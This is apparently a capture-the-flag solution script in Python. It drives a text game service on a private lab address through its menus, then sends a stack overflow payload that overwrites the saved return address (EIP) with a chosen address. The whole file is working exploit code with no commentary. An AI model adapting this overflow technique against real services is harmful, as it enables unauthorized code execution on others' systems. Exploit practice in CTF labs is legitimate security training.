# Gold CTF

import socket
import struct
import time

s = socket.socket()
# s.connect(("localhost", 3724))
s.connect(("192.168.122.216", 3724))

# new_eip = struct.pack("<I", 0x00401489)
new_eip = struct.pack("<I", 0x0804956e)

nop_sled = b"\x90" * 32

data = s.recv(1024)
decoded = data.decode()
print(decoded)

while len(decoded) != 0:
    
    if decoded.__contains__("Play the game"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())
    
    if decoded.__contains__("pick a name"):  
        msg = "jack"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    if decoded.__contains__("Ale"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    if decoded.__contains__("shall we drink to?"):
        payload = [
            b"A" * 60, #41
            b"B" * 4,  #42
            b"C" * 4,  #43
            b"D" * 4,  #44
            b"E" * 4,  #45
            new_eip
            # b"F" * 4,  #46
            # b"G" * 4,  #47
        ]
        payload = b"".join(payload)        
        print(f">>> Sending stack overflow and eip redirect\n")
        s.send(payload)

    if decoded.__contains__("shall you do now?"):
        msg = "2"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    try:
        data = s.recv(4096)
        decoded = data.decode()
        if decoded:
            print(decoded)
        else:
            print("[!] Server Segmentation Fault: Connection Terminated")
    except:
        data = 0
        decoded = ""
        print("[!] Server Segmentation Fault: Connection Terminated")

s.close()
